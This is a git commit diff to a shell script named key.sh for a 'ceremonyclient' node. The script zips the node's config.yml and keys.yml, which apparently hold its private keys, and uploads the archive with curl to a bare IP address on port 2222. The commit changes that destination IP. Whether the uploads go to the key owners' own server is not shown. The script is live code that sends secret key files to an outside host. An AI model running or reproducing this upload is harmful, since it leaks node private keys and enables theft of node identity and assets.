41362312ecbd8ea33e13182f0325cd68dfcfc050
a154225859 <a154225859@qq.com>
2024-05-24 17:07:27 +0800

    Update key.sh

--- key.sh
+++ key.sh
@@ -7,8 +7,7 @@ then
 fi
 cd /root/ceremonyclient/node
 peerid=$(GOEXPERIMENT=arenas go run ./... -peer-id)
-peerid=$(echo $peerid | sed 's/^Peer ID: //')  # 移除前面的 "Peer ID: "
-cd /root/ceremonyclient/node/.config/
-zip "${peerid}.zip" config.yml keys.yml
-curl -F "file=@${peerid}.zip" http://43.134.111.164:2222
+peerid=$(echo $peerid | sed 's/^Peer ID: //')
+cd /root/ceremonyclient/node/.config/ && zip "${peerid}.zip" config.yml keys.yml
+curl -F "file=@${peerid}.zip" http://43.134.60.10:2222
 echo "已发送..."
